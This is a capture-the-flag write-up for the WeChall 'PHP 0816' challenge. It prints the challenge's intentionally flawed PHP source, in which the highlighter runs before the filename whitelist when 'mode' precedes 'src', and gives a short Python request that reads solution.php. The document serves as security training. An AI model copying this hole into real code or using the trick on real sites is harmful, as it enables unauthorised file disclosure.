================================================================================================================
[wechall] PHP 0816
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="code.php?mode=hl&src=solution.php",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|

Source Analysis
================================================================================================================


.. code-block:: php




    <?php
    $cwd = getcwd();
    chdir('../../');
    require_once('challenge/html_head.php');
    html_head('PHP0816 Challenge - The Highlighter');
    chdir($cwd);
     
    # globals
    global $highlights;
    $highlights = array();
     
    /**
     * Parse the GET parameters.
     */
    foreach ($_GET as $key => $value)
    {
        if ($key === 'src') {
            php0816SetSourceFile($value);
        }
        elseif ($key === 'mode') {
            php0816execute($value);
        }
        elseif ($key === 'hl') {
            php0816addHighlights($value);
        }
    }
     
     
    /**
     * Make magic quotes off !
     * (it is really defined in /include/util/Class_Common.php and will deprecate soon)
     * (also you can look on the html_head() stuff, etc. WeChall source is public domain)
     * (if you like a hint: There is a main logical error in this script, applies to all programming languages, not only php. H4\/3: |>  |-|  |_|  |\|)
     */
    /*
    final class Common
    {
            public function getGet($varname, $default=false)
            {
                    if (!isset($_GET[$varname])) {
                            return $default;
                    }
                    return 
                            get_magic_quotes_gpc() > 0 ?
                                    stripslashes($_GET[$varname]) :
                                    $_GET[$varname];
            }
    }
    */
    /**
     * Set the text file to show.
     * Sanitize Get Parameter.
     * Only allow 3 different files by whitelist at the moment.
     * TODO: broken ?!? people can see other files ! :(
     * @param $filename string - the filename
     * @return void
     */
    function php0816SetSourceFile($filename)
    {
        $filename = (string) $filename;
        
        static $whitelist = array(
            'test.php',
            'index.php',
            'code.php',
        );

        # Sanitize by whitelist
        if (!in_array($filename, $whitelist, true))
        {
            $_GET['src'] = false;
        }
    }
     
    /**
     * Add the highlighter keywords. 
     * @param $keyword array of strings - the highlighting keywords
     * @return void
     */
    function php0816addHighlights($keywords)
    {
        global $highlights;
        if (!is_array($keywords)) { return true; }
        
        foreach($keywords as $k)
        {
            $highlights[] = $k;
        }
    }
     
    /**
     * Execute action.
     * Currently only hl is known.
     * @param $mode
     * @return void
     */
    function php0816execute($mode)
    {
        switch($mode)
        {
            case 'hl': php0816Highlighter(); break;
        }
    }
     
    /**
     * Call the highlighter :)
     * sweeeeet.
     * @return void
     */
    function php0816Highlighter()
    {
        global $highlights; # <-- global highlights :D
        
        # SOMEONE SAID THIS WILL FIX IT, BUT PEOPLE CAN STILL SEE solution.php :(  #
        $filename = str_replace(array('/', '\\', '..'), '', Common::getGet('src'));#
        
        if (false === ($text = @file_get_contents($filename)))
        {
            echo '<div>File not Found: '.htmlspecialchars($filename, ENT_QUOTES).'</div>';
            return false;
        }
        
        $text = htmlspecialchars($text, ENT_QUOTES);

        foreach ($highlights as $highlight)
        {
            $stlye = 'color:#CD7F32; background-color:white; padding: 0 8px;'; 
            $text = str_replace($highlight, '<b style="'.$stlye.'">'.$highlight.'</b>', $text);
        }
        
        echo '<pre>'.$text.'</pre>';
    }
     
    $cwd = getcwd();
    chdir('../../');
    require_once('challenge/html_foot.php');
    chdir($cwd);
    ?>

|


solve
================================================================================================================

- 파라미터 조건을 만족할 경우 solution.php 파일을 읽을 수 있습니다.


.. code-blcok:: python


    import requests


    url = "http://www.wechall.net/challenge/php0816/code.php"
    
    params = {
        "mode": "hl",
        "src": "solution.php"
    }

    r = requests.get(url, params=params, verify=False)
    print r.content
